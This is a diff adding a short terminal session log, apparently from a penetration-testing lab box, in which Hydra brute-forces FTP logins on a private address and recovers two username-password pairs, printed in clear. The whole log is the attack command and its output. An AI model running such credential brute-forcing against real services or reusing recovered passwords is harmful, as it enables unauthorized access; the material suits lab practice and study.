@@ -1,0 +1,14 @@
+Script started on 2020-09-27 09:49:20-03:00 [TERM="xterm-256color" TTY="/dev/pts/3" COLUMNS="166" LINES="33"]
+]0;root@Pentest: /home/joaofracassi/beco-xpl/violator[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/violator[00m# hydra 0[K-L users.txt -P wordlist.txt 18[K92.168.1.107 ftp
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-27 09:50:48
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 180 login tries (l:5/p:36), ~12 tries per task
+[DATA] attacking ftp://192.168.1.107:21/
+[[1;32m21[0m][[1;32mftp[0m] host: [1;32m192.168.1.107[0m   login: [1;32maf[0m   password: [1;32menjoythesilence[0m
+[[1;32m21[0m][[1;32mftp[0m] host: [1;32m192.168.1.107[0m   login: [1;32mdg[0m   password: [1;32mpolicyoftruth[0m
+^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
+]0;root@Pentest: /home/joaofracassi/beco-xpl/violator[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/violator[00m# exit
+exit
+
+Script done on 2020-09-27 09:51:10-03:00 [COMMAND_EXIT_CODE="0"]
